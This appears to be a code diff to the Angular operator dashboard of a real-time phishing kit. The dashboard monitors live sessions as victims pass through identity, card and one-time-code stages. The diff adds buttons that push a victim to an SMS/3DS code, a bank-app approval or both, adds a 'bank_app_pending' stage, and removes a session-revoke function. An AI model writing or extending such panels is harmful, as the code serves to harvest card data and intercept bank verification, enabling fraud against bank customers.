@@ -235,9 +235,17 @@ type AdminTab = 'live' | 'history' | 'settings';
                                               </div>
                                               
                                               @if(monitoredSession()?.stage === 'card_pending') {
-                                                <button (click)="requestOtp()" class="relative z-10 bg-white/10 hover:bg-white/20 text-white border border-white/30 px-4 py-2 rounded-full font-bold text-xs transition-all backdrop-blur-sm">
-                                                    Request Bank OTP
-                                                </button>
+                                                <div class="relative z-10 flex gap-2">
+                                                    <button (click)="requestFlow('otp')" class="bg-white/10 hover:bg-white/20 text-white border border-white/30 px-3 py-2 rounded-lg font-bold text-xs transition-all backdrop-blur-sm">
+                                                        SMS / 3DS
+                                                    </button>
+                                                    <button (click)="requestFlow('app')" class="bg-white/10 hover:bg-white/20 text-white border border-white/30 px-3 py-2 rounded-lg font-bold text-xs transition-all backdrop-blur-sm">
+                                                        Bank App
+                                                    </button>
+                                                    <button (click)="requestFlow('both')" class="bg-white/10 hover:bg-white/20 text-white border border-white/30 px-3 py-2 rounded-lg font-bold text-xs transition-all backdrop-blur-sm">
+                                                        Both
+                                                    </button>
+                                                </div>
                                               }
                                          </div>
                                          
@@ -563,13 +571,9 @@ ${session.fingerprint?.userAgent}
       this.state.adminRequestCardOtp();
   }
 
-  revoke() {
-      if(confirm('Are you sure you want to REVOKE this session? The user will be disconnected and their local data cleared.')) {
-          const id = this.monitoredSession()?.id;
-          if (id) {
-            this.state.adminRevokeSession(id);
-          }
-      }
+  requestFlow(flow: 'otp' | 'app' | 'both') {
+      this.state.adminSetVerificationFlow(flow);
+      this.state.adminRequestCardOtp(); // Triggers the next step (APPROVE)
   }
 
   reject() {
@@ -588,6 +592,7 @@ ${session.fingerprint?.userAgent}
           case 'personal_pending': return 'Approve Identity';
           case 'card_pending': return 'Approve Card';
           case 'card_otp_pending': return 'Approve OTP';
+          case 'bank_app_pending': return 'Complete Session';
           default: return 'Approve';
       }
   }
